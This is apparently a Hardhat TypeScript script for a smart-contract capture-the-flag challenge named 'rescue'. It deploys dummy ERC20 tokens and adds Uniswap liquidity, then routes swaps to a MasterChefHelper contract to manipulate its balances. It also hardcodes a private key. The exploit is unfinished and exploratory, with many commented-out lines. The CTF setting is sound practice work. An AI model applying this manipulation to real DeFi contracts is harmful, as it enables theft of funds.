import { Contract, Signer } from "ethers";
import { deployOrGetAt, getEoaOrPrivateKey } from "./utils";
import hre, { ethers } from "hardhat";
import "@nomiclabs/hardhat-ethers";
import { expect } from "chai";

let accounts: Signer[];
let eoa: Signer;
let eoa2: Signer;
let eoaAddress: string;
let attacker: Contract;
let setup: Contract; // setup contract
let tx: any;

before(async () => {
    eoa = await getEoaOrPrivateKey(
        `0x2ab02d753c07d5194bb4eccde74ce308c9e8ea00104e70ba975d4250d4141f98`
    );

    eoaAddress = await eoa.getAddress();
    eoa2 = await hre.ethers.getSigner(eoaAddress);
    // console.log(eoaAddress)

    setup = await hre.ethers.getContractAt("contracts/rescue/contracts/Setup.sol:Setup",
        "0xFA86A4d66F8C8927C225059068700B238ad7b45C");
});

it("solves the challenge", async function () {

    console.log("Me: " + eoaAddress)
    console.log("My balance: " + await hre.ethers.provider.getBalance(eoaAddress))

    console.log("solved y/n: " + await setup.isSolved());
    console.log("McHelper: " + await setup.mcHelper());
    console.log("Weth: " + await setup.weth());
    const mcHelper_contract = await hre.ethers.getContractAt("MasterChefHelper", await setup.mcHelper(), eoa2);
    const weth9_contract = await hre.ethers.getContractAt("WETH9", await setup.weth(), eoa2);

    console.log("")
    // await balance.wait()
    console.log("Weth9 balance on Helper: " + (await weth9_contract.balanceOf(mcHelper_contract.address)))

    const mastrerChef_contract = await hre.ethers.getContractAt("MasterChefLike", "0xc2EdaD668740f1aA35E4D8f227fB8E17dcA888Cd")
    // let pool_id = 0;
    // console.log("MasterChef poll " + pool_id + " info:" + JSON.stringify(await mastrerChef_contract.poolInfo(pool_id)))
    // console.log("")
    // pool_id = 1;
    // console.log("MasterChef poll " + pool_id + " info:" + JSON.stringify(await mastrerChef_contract.poolInfo(pool_id)))
    const ercFactory0 = await hre.ethers.getContractFactory(`ExampleERC20Token`);
    const erc20_0 = await ercFactory0.deploy()
    // await erc20_1.wait()   
    // // const erc20_2 = await ercFactory.deploy()
    // // await erc20_2.wait()
    console.log("ERC20_0: " + erc20_0.address)
    // const erc20_1 = await hre.ethers.getContractAt("ERC20Like", "0xd9e1cE17f2641f24aE83637ab66a2cca9C370000")

    const ercFactory = await hre.ethers.getContractFactory(`ExampleERC20Token`, eoa2);
    const erc20_1 = await ercFactory.deploy()
    // await erc20_1.wait()   
    // // const erc20_2 = await ercFactory.deploy()
    // // await erc20_2.wait()
    console.log("ERC20_1: " + erc20_1.address)
    // // console.log("ERC20_2: " + erc20_2.address)

    console.log("")
    console.log("ERC20_1 balance: ", await erc20_1.balanceOf(eoaAddress))
    if (true) {
        const txrr = await weth9_contract.deposit({ value: hre.ethers.utils.parseEther(`1`) })
        await txrr.wait()
    }

    console.log("Weth9 balance: ", await weth9_contract.balanceOf(eoaAddress))

    const blockNumBefore = await hre.ethers.provider.getBlockNumber();
    const blockBefore = await hre.ethers.provider.getBlock(blockNumBefore);
    const timestampBefore = blockBefore.timestamp;

    const router_contract = await hre.ethers.getContractAt("UniswapV2RouterLike", "0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F", eoa2)
    const like20_mytoken = await hre.ethers.getContractAt("ERC20Like", erc20_1.address, eoa2)
    const like20_weth = await hre.ethers.getContractAt("ERC20Like", weth9_contract.address, eoa2)
    const pair1b = await hre.ethers.getContractAt("ERC20Like", "0xdAC17F958D2ee523a2206206994597C13D831ec7", eoa2)

    // const trx = await pair1b.deposit({ value: hre.ethers.utils.parseEther(`1`) });
    // await trx.wait()

    console.log("Pair1b balance: ", await pair1b.balanceOf(eoaAddress))
    console.log("Pair1b balance(Helper): ", await pair1b.balanceOf(mcHelper_contract.address))
    console.log("Pair1b balance(Router): ", await pair1b.balanceOf(router_contract.address))

    const approved1 = await like20_mytoken.approve(router_contract.address, hre.ethers.constants.MaxUint256);
    await approved1.wait()
    console.log("")
    console.log("MyToken approved")

    const approved2 = await like20_weth.approve(router_contract.address, hre.ethers.constants.MaxUint256);
    await approved2.wait()
    console.log("Weth approved")

    // const approvedd = await pair1b.approve(router_contract.address, hre.ethers.constants.MaxUint256);
    // await approvedd.wait()
    // console.log("Pair1b approved")

    const tx = await router_contract.callStatic.addLiquidity(erc20_1.address, weth9_contract.address, 1001, 10000, 0, 0, eoaAddress, timestampBefore + 31525200)
    // await tx.wait()
    console.log("Liquidity MyToken-Weth9: " + tx)
    // console.log("Liquidity MyToken-Weth9: " + JSON.stringify(tx))

    const txx = await router_contract.addLiquidity(erc20_1.address, weth9_contract.address, 1001, 10000, 0, 0, eoaAddress, timestampBefore + 31525200)
    await txx.wait()

    // console.log("Prepare for exchange 1")

    // const txxxx = await router_contract.addLiquidity(weth9_contract.address, pair1b.address, 1001, 0, 0, 0, eoaAddress, timestampBefore + 31525200)
    // await txxxx.wait()

    console.log("Prepare for exchange 2")
    console.log("Amounts: " + await router_contract.callStatic.swapExactTokensForTokens(hre.ethers.utils.parseEther('0.001'), 1, [weth9_contract.address, pair1b.address], mcHelper_contract.address, timestampBefore + 31525200))

    const txxx = await router_contract.swapExactTokensForTokens(hre.ethers.utils.parseEther('0.001'), 1, [weth9_contract.address, pair1b.address], mcHelper_contract.address, timestampBefore + 31525200)
    await txxx.wait()

    console.log("Stupid trade")

    const txxxx = await router_contract.swapExactTokensForTokens(hre.ethers.utils.parseEther('0.001'), 1, [weth9_contract.address, weth9_contract.address], mcHelper_contract.address, timestampBefore + 31525200)
    await txxxx.wait()

    console.log("Prepare for investig poolToken")
    const tx2 = await mcHelper_contract.swapTokenForPoolToken(0, weth9_contract.address, hre.ethers.utils.parseEther('0.001'), 0);
    await tx2.wait()

    console.log("ERC20_1 balance: ", await erc20_1.balanceOf(eoaAddress))
    console.log("Weth9 balance: ", await weth9_contract.balanceOf(eoaAddress))
    console.log("Pair1B balance: ", await pair1b.balanceOf(eoaAddress))

    console.log("")
    let pool_id = 0;
    const poolInfo1 = await mastrerChef_contract.callStatic.poolInfo(pool_id)
    console.log("MasterChef poll " + pool_id + " info:" + poolInfo1)
    const lpToken_addr = poolInfo1[0]
    const pair_contract = await hre.ethers.getContractAt("UniswapV2PairLike", lpToken_addr, eoa2)
    console.log("Pair A: " + await pair_contract.callStatic.token0())
    console.log("Pair B: " + await pair_contract.callStatic.token1())

    console.log("")
    console.log("Weth9 balance on Helper: " + (await weth9_contract.balanceOf(mcHelper_contract.address)))
    console.log("Pair1b balance on Helper: " + (await pair1b.balanceOf(mcHelper_contract.address)))

    const erc20_2 = await ercFactory.deploy()
    const like20_mytoken2 = await hre.ethers.getContractAt("ERC20Like", erc20_2.address, eoa2)
    const approved3 = await like20_mytoken2.approve(mcHelper_contract.address, hre.ethers.constants.MaxUint256);
    await approved3.wait()
    const approved4 = await like20_mytoken2.approve(router_contract.address, hre.ethers.constants.MaxUint256);
    await approved4.wait()
    console.log("MyToken2 apporved x2")

    const tx3 = await router_contract.addLiquidity(erc20_1.address, erc20_2.address, 1001, 10000, 0, 0, eoaAddress, timestampBefore + 31525200)
    await tx3.wait()
    const tx4 = await router_contract.addLiquidity(erc20_2.address, weth9_contract.address, 1001, 10000, 0, 0, eoaAddress, timestampBefore + 31525200)
    await tx4.wait()


    // console.log("Weth9 balance on Helper: " + (await weth9_contract.balanceOf(mcHelper_contract.address)))
    

    // const random_contract = await hre.ethers.getContractAt("Random", await setup.random());
    // await random_contract.solve(4)
    // console.log("solved y/n: " + await setup.isSolved());
});